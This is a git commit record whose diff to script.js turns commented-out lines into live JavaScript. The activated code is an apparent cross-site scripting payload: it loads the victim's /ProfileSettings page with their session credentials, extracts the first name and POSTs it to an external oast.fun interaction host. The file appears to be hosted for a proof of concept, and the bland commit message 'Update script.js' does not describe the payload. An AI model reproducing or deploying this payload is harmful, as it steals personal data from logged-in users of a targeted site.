71e3e788c7afca9ed5fa14a0b6767295381b7f2b
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2024-09-19 01:04:25 +0330

    Update script.js

--- script.js
+++ script.js
@@ -1,6 +1,6 @@
-//xhr=new XMLHttpRequest();
-//xhr.open('GET','/ProfileSettings#general');
-//xhr.withCredentials=true;
-//xhr.onreadystatechange=()=>{if(xhr.readyState==4){dom=new DOMParser().parseFromString(xhr.response,'text/html');var firstName = dom.querySelector('[data-bind="text: firstName"]').textContent;xhr=new XMLHttpRequest();xhr.open("POST","https://kypdqokutkzjkenfltayept3ry0mphyy4.oast.fun");xhr.send(`firstName=${firstName}`);}};
-//xhr.send();
-alert()
+xhr=new XMLHttpRequest();
+xhr.open('GET','/ProfileSettings#general');
+xhr.withCredentials=true;
+xhr.onreadystatechange=()=>{if(xhr.readyState==4){dom=new DOMParser().parseFromString(xhr.response,'text/html');var firstName = dom.querySelector('[data-bind="text: firstName"]').textContent;xhr=new XMLHttpRequest();xhr.open("POST","https://kypdqokutkzjkenfltayept3ry0mphyy4.oast.fun");xhr.send(`firstName=${firstName}`);}};
+xhr.send();
+
